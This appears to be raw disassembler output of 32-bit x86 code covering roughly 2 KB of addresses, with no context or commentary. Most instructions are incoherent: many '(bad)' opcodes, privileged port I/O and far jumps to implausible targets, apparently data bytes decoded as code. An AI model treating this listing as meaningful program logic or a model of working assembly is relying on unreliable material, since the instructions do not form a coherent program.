  4171f3:	mov    bl,0xe1
  4171f5:	jne    0x417225
  4171f7:	jae    0x4171fc
  4171f9:	xor    BYTE PTR [ebp-0x29],bl
  4171fc:	mov    ebx,0x5c98d51e
  417201:	mov    esp,0xf5c3ad17
  417206:	int    0x89
  417208:	or     ah,cl
  41720a:	cmp    BYTE PTR [edx+0x64414756],0x8d
  417211:	in     al,0xf7
  417213:	(bad)  
  417214:	imul   edi,ecx,0x64
  417217:	xlat   BYTE PTR ds:[ebx]
  417218:	in     al,dx
  417219:	or     eax,0xd6ad8940
  41721e:	mov    bh,0x16
  417220:	push   edi
  417221:	mov    eax,0x63f07f06
  417226:	mov    edi,0x3ef28e2d
  41722b:	mov    ds:0xe2049bbc,eax
  417230:	dec    DWORD PTR [esi+ebp*8]
  417233:	push   eax
  417234:	cmp    eax,0x3352d958
  417239:	add    al,0x4f
  41723b:	xchg   ecx,eax
  41723c:	stc    
  41723d:	dec    edx
  41723e:	inc    ebx
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	cmp    edx,DWORD PTR [esi+ecx*1+0x28]
  417258:	jo     0x417280
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0x70707e
  417261:	push   esp
  417262:	(bad)  
  417263:	fnstsw WORD PTR [ecx+edi*1]
  417266:	std    
  417267:	xor    DWORD PTR [eax+0x43c43172],eax
  41726d:	and    al,0x73
  41726f:	sbb    eax,0x26c8ea26
  417274:	pop    es
  417275:	pop    ebx
  417276:	hlt    
  417277:	in     eax,dx
  417278:	loopne 0x417247
  41727a:	rcl    BYTE PTR [ecx+0x114c487e],cl
  417280:	mov    esi,DWORD PTR [ecx]
  417282:	pcmpgtb mm0,QWORD PTR [ebx]
  417285:	shl    DWORD PTR [eax-0x192c7cfb],cl
  41728b:	(bad)  
  41728c:	out    dx,eax
  41728d:	mov    dl,0x46
  41728f:	repz jp 0x41729d
  417292:	cld    
  417293:	pop    esp
  417294:	ds pop ebp
  417296:	gs pushf 
  417298:	aad    0x1c
  41729a:	int3   
  41729b:	jnp    0x4172f5
  41729d:	jnp    0x417286
  41729f:	js     0x417282
  4172a1:	add    edi,DWORD PTR [ecx+esi*1]
  4172a4:	scas   eax,DWORD PTR es:[edi]
  4172a5:	push   ebp
  4172a6:	xchg   DWORD PTR [ebx+0x5545948e],ebx
  4172ac:	sbb    ebx,DWORD PTR [ebx]
  4172ae:	jg     0x417316
  4172b0:	loop   0x4172d8
  4172b2:	pushf  
  4172b3:	dec    ecx
  4172b4:	(bad)  
  4172b5:	adc    DWORD PTR ss:[eax],0x973c2307
  4172bc:	cwde   
  4172bd:	ret    
  4172be:	inc    edx
  4172bf:	pop    esp
  4172c0:	adc    esp,DWORD PTR [edx-0x28a7b092]
  4172c6:	cmp    eax,0x734344f2
  4172cb:	jb     0x41724e
  4172cd:	aam    0x39
  4172cf:	jmp    0x41729a
  4172d1:	xchg   edx,eax
  4172d2:	lahf   
  4172d3:	lea    edi,[ebp+0x3]
  4172d6:	mov    esi,0x8b45ce84
  4172db:	adc    eax,0x5c7cf455
  4172e0:	in     eax,dx
  4172e1:	test   BYTE PTR es:[ebx+0x70],dh
  4172e5:	and    BYTE PTR [edx],dl
  4172e7:	out    0x9b,eax
  4172e9:	shl    BYTE PTR [esi+esi*8-0x4a484489],cl
  4172f0:	aas    
  4172f1:	out    dx,eax
  4172f2:	loopne 0x41731d
  4172f4:	mov    ebp,DWORD PTR [esp+eax*1-0x4]
  4172f8:	mov    ch,0xa1
  4172fa:	add    al,0x48
  4172fc:	push   0x923262c0
  417301:	(bad)  
  417302:	loopne 0x41734d
  417304:	mov    ds:0xf5a06eba,eax
  417309:	popf   
  41730a:	enter  0xdc98,0x89
  41730e:	pop    eax
  41730f:	out    dx,al
  417310:	arpl   WORD PTR [ecx-0x4c],cx
  417313:	pop    edi
  417314:	je     0x417334
  417316:	pop    es
  417317:	dec    esp
  417318:	outs   dx,DWORD PTR ds:[esi]
  417319:	and    ebx,esi
  41731b:	pop    edi
  41731c:	dec    edi
  41731d:	pop    edx
  41731e:	shr    ah,1
  417320:	cs mov bl,0x72
  417323:	inc    esp
  417324:	jmp    0x417327
  417326:	sbb    eax,0x1404c1a1
  41732b:	sti    
  41732c:	pop    ds
  41732d:	mov    BYTE PTR [ebp+0x34],al
  417330:	or     eax,0xbcbd1f8b
  417335:	in     al,dx
  417336:	add    DWORD PTR [ebp+0xf],ecx
  417339:	mov    eax,0x883edf92
  41733e:	inc    edx
  41733f:	mov    bl,BYTE PTR [edi+eax*8-0x2c2739df]
  417346:	mov    al,ds:0x2342d3f8
  41734b:	sbb    esp,DWORD PTR gs:[ebp-0x3e]
  41734f:	mov    ecx,0x66920a43
  417354:	imul   esi,DWORD PTR [edx+0x44],0x862605b3
  41735b:	iret   
  41735c:	xchg   ebx,eax
  41735d:	aas    
  41735e:	mov    ebp,DWORD PTR [esi+0x53]
  417361:	jmp    0x4173b9
  417363:	je     0x41730d
  417365:	mov    esi,0x4db4b65e
  41736a:	sar    BYTE PTR [ebx],1
  41736c:	(bad)  
  41736e:	ret    0xbdc0
  417371:	adc    DWORD PTR [edx],eax
  417373:	imul   edi,DWORD PTR [edi-0x68d96b15],0x6715b53c
  41737d:	mov    ebp,0x984c09b3
  417382:	mov    bh,BYTE PTR [ecx+edx*2-0x5]
  417386:	ret    
  417387:	inc    edx
  417388:	xor    DWORD PTR [esi-0x3b],esp
  41738b:	(bad)  
  41738c:	mov    bh,0x8e
  41738e:	mov    dh,0xb2
  417390:	outs   dx,BYTE PTR ds:[esi]
  417391:	sahf   
  417392:	sub    dh,BYTE PTR [ecx+0x25a00d8b]
  417398:	xor    ch,al
  41739a:	inc    ebx
  41739b:	por    mm0,QWORD PTR [eax]
  41739e:	push   ebx
  41739f:	nop    DWORD PTR [eax]
  4173a2:	inc    ebp
  4173a3:	scas   al,BYTE PTR es:[edi]
  4173a4:	mov    dh,0x98
  4173a6:	xchg   edi,eax
  4173a7:	mov    ecx,edi
  4173a9:	out    0xc2,eax
  4173ab:	call   0x46f0:0x632b7e28
  4173b2:	pop    ecx
  4173b3:	push   esi
  4173b4:	push   ebx
  4173b5:	jns    0x4173e1
  4173b7:	out    0x5a,al
  4173b9:	xchg   edx,eax
  4173ba:	push   ss
  4173bb:	xor    BYTE PTR [eax+ebx*4+0x4c67afd7],0x3b
  4173c3:	add    DWORD PTR [ebx],0x5b
  4173c6:	or     eax,0xb108e5b
  4173cb:	and    BYTE PTR [ebp+ecx*1+0x61],0x32
  4173d0:	int    0xb3
  4173d2:	sti    
  4173d3:	and    BYTE PTR [edi+0x58],0xb7
  4173d7:	mov    al,0x36
  4173d9:	dec    esi
  4173da:	cmp    eax,0xf6604129
  4173df:	rcr    esp,1
  4173e1:	add    DWORD PTR [esi-0x2ff0995d],ebx
  4173e7:	repnz xor bl,BYTE PTR [eax+0x3630d350]
  4173ee:	adc    DWORD PTR [esi-0x38e5e5de],eax
  4173f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173f5:	mov    ebx,0xbcf01004
  4173fa:	sbb    DWORD PTR [edi],eax
  4173fc:	ins    BYTE PTR es:[edi],dx
  4173fd:	pop    ss
  4173fe:	mov    ebp,0x62e9caa4
  417403:	neg    BYTE PTR [ecx+0x75d8be1]
  417409:	sub    al,0x3c
  41740b:	mov    al,0x1d
  41740d:	mov    al,BYTE PTR [edi+0x2b46de31]
  417413:	xor    al,bl
  417415:	fisubr WORD PTR [esp+esi*2]
  417418:	repz test DWORD PTR [edx+edx*2+0x773705a8],ebx
  417420:	repnz inc eax
  417422:	mov    ebx,0x6a8e06d0
  417427:	not    ebp
  417429:	arpl   WORD PTR [ebx],si
  41742b:	jle    0x4173b0
  41742d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41742e:	pusha  
  41742f:	jmp    0x417455
  417431:	cmp    ecx,ecx
  417433:	mov    dh,bh
  417435:	dec    eax
  417436:	lea    esp,[ebx-0x37014970]
  41743c:	lods   eax,DWORD PTR ds:[esi]
  41743d:	cld    
  41743e:	test   al,0xc0
  417440:	scas   eax,DWORD PTR es:[edi]
  417441:	pop    ebp
  417442:	and    DWORD PTR [ecx+0x589819c4],eax
  417448:	retf   
  417449:	mov    WORD PTR [ebx-0x76c4ba86],gs
  41744f:	arpl   WORD PTR [ecx],cx
  417451:	jb     0x41748d
  417453:	adc    bl,dl
  417455:	jmp    0x41741d
  417457:	pop    esp
  417458:	ins    BYTE PTR es:[edi],dx
  417459:	cwde   
  41745a:	imul   DWORD PTR [ebx-0x22]
  41745d:	add    al,0x76
  41745f:	imul   esp,DWORD PTR [eax-0x3f02b4f9],0x812fb851
  417469:	loop   0x41740a
  41746b:	and    ebx,edx
  41746d:	out    dx,al
  41746e:	push   0x98dd6590
  417473:	cmp    bl,BYTE PTR [ecx+0x47]
  417476:	sub    ecx,ebx
  417478:	and    ch,BYTE PTR [ebx-0x7a]
  41747b:	xor    edi,ebx
  41747d:	dec    eax
  41747e:	retf   0xa8e4
  417481:	cwde   
  417482:	push   ss
  417483:	jo     0x4174a8
  417485:	loope  0x4174ce
  417487:	cbw    
  417489:	jb     0x417442
  41748b:	jo     0x4174b6
  41748d:	jb     0x4174bb
  41748f:	mov    bl,0x72
  417491:	ja     0x4174a8
  417493:	ret    
  417494:	lods   eax,DWORD PTR ds:[esi]
  417495:	inc    ebx
  417496:	fcmovbe st,st(5)
  417498:	imul   edi,DWORD PTR [eax],0x7f
  41749b:	add    ch,dh
  41749d:	xor    ebp,DWORD PTR [ebx]
  41749f:	hlt    
  4174a0:	lahf   
  4174a1:	pop    ds
  4174a2:	xor    BYTE PTR [eax+esi*2-0x22d291b3],0x21
  4174aa:	sbb    DWORD PTR [edx-0x9],ecx
  4174ad:	jns    0x4174c5
  4174af:	in     al,0xbb
  4174b1:	adc    edi,DWORD PTR [ebp-0x1f]
  4174b4:	add    eax,edx
  4174b6:	add    ebp,DWORD PTR [ebx+0x7f]
  4174b9:	add    eax,0x60c1afae
  4174be:	sub    al,BYTE PTR [ecx-0x507b834d]
  4174c4:	jmp    0x6aeed5a9
  4174c9:	fsub   QWORD PTR [ecx]
  4174cb:	dec    ecx
  4174cc:	fidivr DWORD PTR [edi]
  4174ce:	push   0xc
  4174d0:	xchg   esp,eax
  4174d1:	adc    BYTE PTR [edx],0xca
  4174d4:	add    BYTE PTR [edi-0x1e],dh
  4174d7:	dec    ebp
  4174d8:	xor    eax,0xe59e393d
  4174dd:	inc    edi
  4174de:	std    
  4174df:	(bad)  
  4174e0:	mul    DWORD PTR [ebx]
  4174e2:	inc    edi
  4174e3:	ficom  WORD PTR [ecx-0x4f]
  4174e6:	dec    edx
  4174e7:	test   al,dl
  4174e9:	fisub  DWORD PTR [ecx]
  4174eb:	cmp    al,0x34
  4174ed:	mov    ecx,0x4bc6b7c3
  4174f2:	inc    ebp
  4174f3:	xor    al,0x70
  4174f5:	clc    
  4174f6:	int    0x34
  4174f8:	test   eax,0xb348acfc
  4174fd:	and    al,al
  4174ff:	xchg   esi,eax
  417500:	cmp    eax,0xd1ba726d
  417505:	(bad)  [edx+0x5b]
  417508:	jge    0x41753f
  41750a:	(bad)  [edx-0x69]
  41750d:	add    esi,DWORD PTR [edi-0x77656d51]
  417513:	std    
  417514:	test   BYTE PTR [ebx],al
  417516:	test   BYTE PTR [edx-0x57],bh
  417519:	mov    BYTE PTR [edx],dh
  41751b:	dec    edi
  41751c:	xchg   ebx,eax
  41751d:	xchg   esp,eax
  41751e:	pop    esi
  41751f:	mov    bl,bh
  417521:	rcl    DWORD PTR [eax-0x68],1
  417524:	aam    0xef
  417526:	inc    ecx
  417527:	xor    edx,edx
  417529:	add    DWORD PTR [ebp-0xc],ebx
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [ebx-0x46695a78],edx
  417547:	and    al,0x7f
  417549:	jo     0x417504
  41754b:	jle    0x4175bd
  41754d:	jo     0x417540
  41754f:	(bad)  
  417550:	cdq    
  417551:	sahf   
  417552:	sti    
  417553:	mov    cs,WORD PTR [ecx]
  417555:	xor    edi,DWORD PTR [ecx+0x52]
  417558:	xor    al,0xd1
  41755a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41755b:	inc    esp
  41755c:	test   ah,0xdf
  41755f:	(bad)  
  417560:	sbb    ebp,esp
  417562:	pop    ss
  417563:	pop    ecx
  417564:	in     eax,0xa5
  417566:	adc    eax,DWORD PTR [ebx-0x7d]
  417569:	xchg   esp,eax
  41756a:	sub    BYTE PTR [ecx],ah
  41756c:	add    al,0xa3
  41756e:	(bad)  
  41756f:	sbb    eax,0x9e58fa04
  417574:	xchg   ebp,eax
  417575:	mov    esi,0x200fb552
  41757a:	ss mov dl,0xa8
  41757d:	sub    eax,0x31ba48e6
  417582:	out    0x5c,al
  417584:	jmp    0x417532
  417586:	adc    edx,DWORD PTR [ebp+0x5be9dce]
  41758c:	(bad)  
  41758d:	mov    ch,0x2a
  41758f:	sbb    eax,DWORD PTR [esi+0x18]
  417592:	jnp    0x417550
  417594:	xlat   BYTE PTR ds:[bx]
  417596:	pop    ss
  417597:	jo     0x417584
  417599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41759a:	enter  0xb165,0x35
  41759e:	sahf   
  41759f:	nop
  4175a0:	cmp    BYTE PTR [eax],0x72
  4175a3:	mov    edi,0x21a0ff21
  4175a8:	fstp   DWORD PTR [ebp+0x44a88787]
  4175ae:	jl     0x4175d6
  4175b0:	and    al,0xfc
  4175b2:	inc    edx
  4175b3:	mov    cl,0xac
  4175b5:	cmc    
  4175b6:	adc    DWORD PTR [ebx],edi
  4175b8:	cmp    DWORD PTR [ebx],ebx
  4175ba:	push   0xffffffa1
  4175bc:	cmp    al,0xbb
  4175be:	aaa    
  4175bf:	pop    DWORD PTR [esp+ecx*4]
  4175c2:	loop   0x417598
  4175c4:	adc    eax,0xab2ac749
  4175c9:	dec    edx
  4175ca:	scas   al,BYTE PTR es:[edi]
  4175cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175cc:	jbe    0x41763c
  4175ce:	xor    eax,0x70855c4
  4175d3:	pusha  
  4175d4:	cld    
  4175d5:	push   0x24
  4175d7:	(bad)  
  4175d8:	sub    bh,cl
  4175da:	(bad)
  4175de:	xchg   ebx,eax
  4175df:	push   ebx
  4175e0:	test   al,0xe4
  4175e2:	sbb    BYTE PTR [eax],bh
  4175e4:	jge    0x4175d6
  4175e6:	and    al,0xff
  4175e8:	jle    0x41759f
  4175ea:	lock fdiv st,st(1)
  4175ed:	jns    0x4175f1
  4175ef:	push   ds
  4175f0:	(bad)  
  4175f1:	outs   dx,BYTE PTR ds:[esi]
  4175f2:	sub    al,0xc1
  4175f4:	mov    esp,0xbcee41aa
  4175f9:	cld    
  4175fa:	int3   
  4175fb:	jno    0x417583
  4175fd:	inc    edi
  4175fe:	sub    ebp,DWORD PTR [esi]
  417600:	dec    ecx
  417601:	aaa    
  417602:	inc    ebx
  417603:	imul   edi,DWORD PTR ds:0x41dec245,0x32a28e6b
  41760d:	or     eax,0xfa53c57c
  417612:	jp     0x417641
  417614:	mov    ds:0x2ab59630,al
  417619:	call   0xe58991fb
  41761e:	aam    0x4c
  417620:	xchg   esi,eax
  417621:	sbb    BYTE PTR [edi+0x7e4819e],dl
  417627:	pminsw mm7,QWORD PTR [esi+0x69]
  41762b:	mov    esp,0x5d2368a7
  417630:	popf   
  417631:	mov    bh,0x1f
  417633:	leave  
  417634:	inc    ebp
  417635:	push   es
  417636:	jb     0x417661
  417638:	inc    ebx
  417639:	dec    edx
  41763a:	jmp    0x38e6b0e5
  41763f:	cmp    BYTE PTR [esi+edi*8],dh
  417642:	cmc    
  417643:	fcom   DWORD PTR [ebx-0x6a]
  417646:	test   eax,0x134c56bf
  41764b:	int    0xb4
  41764d:	jp     0x417620
  41764f:	sbb    eax,ebx
  417651:	mul    DWORD PTR [eax]
  417653:	gs repnz in al,dx
  417656:	(bad)  
  417657:	dec    edx
  417658:	dec    ebx
  417659:	cmp    DWORD PTR [esi+0x63],esp
  41765c:	cmp    dl,BYTE PTR [ebp-0x19a94186]
  417662:	xor    BYTE PTR [ecx],dl
  417664:	dec    edx
  417665:	scas   eax,DWORD PTR es:[edi]
  417666:	stc    
  417667:	xlat   BYTE PTR ds:[ebx]
  417668:	inc    edi
  417669:	(bad)  
  41766a:	in     al,dx
  41766b:	mov    fs,edx
  41766d:	xchg   edi,eax
  41766e:	cmp    al,0x2
  417670:	(bad)  
  417671:	adc    BYTE PTR [ecx+0x3509656e],ah
  417677:	cmp    BYTE PTR [eax+0x3c],ah
  41767a:	mov    esi,ecx
  41767c:	in     eax,0x9
  41767e:	sub    dl,BYTE PTR [ebx]
  417680:	and    DWORD PTR [edi-0x71],ebx
  417683:	mov    bh,0xaa
  417685:	mov    ebp,ebx
  417687:	pop    es
  417688:	or     DWORD PTR [edi+0x47],edi
  41768b:	cs lahf 
  41768d:	fild   WORD PTR [ebx+eiz*4-0x67]
  417691:	or     bl,BYTE PTR [eax]
  417693:	cmp    eax,0x79796989
  417698:	xor    eax,0xd255b3f8
  41769d:	das    
  41769e:	dec    ebx
  41769f:	and    BYTE PTR [edx+0x1c7554d0],0x88
  4176a6:	fwait
  4176a7:	lock sub BYTE PTR [esi+ebp*2-0x377ace6a],ch
  4176af:	call   0x3c921d41
  4176b4:	dec    edx
  4176b5:	js     0x417661
  4176b7:	xchg   ebp,eax
  4176b8:	dec    eax
  4176b9:	inc    esi
  4176ba:	jne    0x4176fc
  4176bc:	or     bh,dl
  4176be:	dec    ebp
  4176bf:	lods   al,BYTE PTR ds:[esi]
  4176c0:	gs jae 0x417728
  4176c3:	nop
  4176c4:	push   edi
  4176c5:	iretw  
  4176c7:	pop    ebp
  4176c8:	pop    ebp
  4176c9:	push   0xf54a3644
  4176ce:	in     eax,dx
  4176cf:	pop    edx
  4176d0:	idiv   BYTE PTR [eax+0x0]
  4176d3:	push   eax
  4176d4:	int3   
  4176d5:	scas   eax,DWORD PTR es:[edi]
  4176d6:	mov    dl,0x7d
  4176d8:	jno    0x417726
  4176da:	sub    BYTE PTR [edi-0x47],dh
  4176dd:	outs   dx,BYTE PTR ds:[esi]
  4176de:	sub    al,0x23
  4176e0:	sti    
  4176e1:	mov    cl,0x16
  4176e3:	imul   ebp,DWORD PTR ds:0x58807a3f,0x1b
  4176ea:	sub    eax,0x3406278
  4176ef:	jecxz  0x41768f
  4176f1:	pushf  
  4176f2:	xchg   DWORD PTR [esi+0x7f45d146],esi
  4176f8:	sub    BYTE PTR [ecx+0x26],al
  4176fb:	pop    es
  4176fc:	sbb    DWORD PTR [esi],ebp
  4176fe:	mov    bl,0x55
  417700:	cli    
  417701:	sbb    ebx,edi
  417703:	and    BYTE PTR [ebp-0x1c],dl
  417706:	jmp    0xe4aee687
  41770b:	enter  0x4f95,0x2e
  41770f:	in     eax,dx
  417710:	cmp    ch,bh
  417712:	add    DWORD PTR [edi+0x4b439831],ebp
  417718:	cli    
  417719:	mov    edx,0x8278bd10
  41771e:	or     edi,edx
  417720:	dec    esi
  417721:	mov    BYTE PTR [ebx],bl
  417723:	xchg   ebp,eax
  417724:	inc    ecx
  417725:	loope  0x41777b
  417727:	scas   eax,DWORD PTR es:[edi]
  417728:	adc    al,0xce
  41772a:	pusha  
  41772b:	push   edi
  41772c:	icebp  
  41772d:	adc    dh,ch
  41772f:	fsubr  QWORD PTR [edi+0x5425df5a]
  417735:	push   esi
  417736:	das    
  417737:	imul   esp,DWORD PTR ds:0x212548b0,0x5101629d
  417741:	cs mov edx,0x424a736d
  417747:	and    al,BYTE PTR [edx+0x42b662b5]
  41774d:	(bad)  
  41774f:	data16 xor al,0x12
  417752:	sub    al,BYTE PTR [edx]
  417754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417755:	push   esi
  417756:	adc    DWORD PTR [eiz*1-0x2af75adb],edx
  41775d:	mov    cl,BYTE PTR [edi]
  41775f:	std    
  417760:	cmp    al,0xd5
  417762:	inc    edx
  417763:	or     ch,BYTE PTR [eax+eax*4-0x6f4302c]
  41776a:	jle    0x417794
  41776c:	xchg   ecx,eax
  41776d:	mov    ds:0xf191559b,eax
  417772:	imul   ebx,edi,0x2ffa4626
  417778:	bound  esp,QWORD PTR ds:0x44256cf7
  41777e:	fxam   
  417780:	and    bh,ah
  417782:	mov    WORD PTR [eax+0x3862cff3],ss
  417788:	sbb    eax,0x8b4fdfeb
  41778d:	lahf   
  41778e:	jmp    DWORD PTR [ecx]
  417790:	jno    0x417783
  417792:	and    BYTE PTR ds:0xc0b48e32,dl
  417798:	(bad)  
  417799:	(bad)  [edi-0x56]
  41779c:	inc    ecx
  41779d:	nop
  41779e:	daa    
  41779f:	or     ecx,ebp
  4177a1:	outs   dx,DWORD PTR ds:[esi]
  4177a2:	aaa    
  4177a3:	inc    esp
  4177a4:	es cmp eax,0x6b3a7616
  4177aa:	cmp    BYTE PTR [edx+0x3],ah
  4177ad:	jbe    0x417790
  4177af:	sbb    DWORD PTR [ecx*1-0x72a467a1],0x6e57fba
  4177ba:	or     al,0xfe
  4177bc:	scas   al,BYTE PTR es:[edi]
  4177bd:	arpl   WORD PTR [esi],bp
  4177bf:	push   esi
  4177c0:	xchg   esi,eax
  4177c1:	add    ch,BYTE PTR [edi-0x17]
  4177c4:	sbb    eax,0x87d47043
  4177c9:	add    eax,0xbe4a8dd6
  4177ce:	xchg   ah,bh
  4177d0:	mov    ds:0xa4078d1e,eax
  4177d5:	loop   0x4177d7
  4177d7:	pop    ecx
  4177d8:	rcr    DWORD PTR [ecx-0x26dc97ff],1
  4177de:	fidiv  WORD PTR [eax+0x6de5e094]
  4177e4:	sub    DWORD PTR [ebp+0x40],ecx
  4177e7:	mov    BYTE PTR [ecx],ah
  4177e9:	push   esi
  4177ea:	test   al,0xd4
  4177ec:	rcr    DWORD PTR [eax],cl
  4177ee:	nop
  4177ef:	dec    edx
  4177f0:	sub    edx,ebx
  4177f2:	out    dx,eax
  4177f3:	fdiv   QWORD PTR [eax]
  4177f5:	push   cs
  4177f6:	ins    BYTE PTR es:[edi],dx
  4177f7:	pop    edx
  4177f8:	ins    BYTE PTR es:[edi],dx
  4177f9:	and    al,0xa1
  4177fb:	inc    ecx
  4177fc:	lock pop esi
  4177fe:	or     ecx,DWORD PTR [ecx]
  417800:	dec    edx
  417801:	je     0x4177d5
  417803:	(bad)  
  417804:	out    0xce,al
  417806:	lahf   
  417807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417808:	cdq    
  417809:	call   0x3d7da26
  41780e:	imul   esp,DWORD PTR [ecx-0x1fbe47e1],0x47
  417815:	pop    esi
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
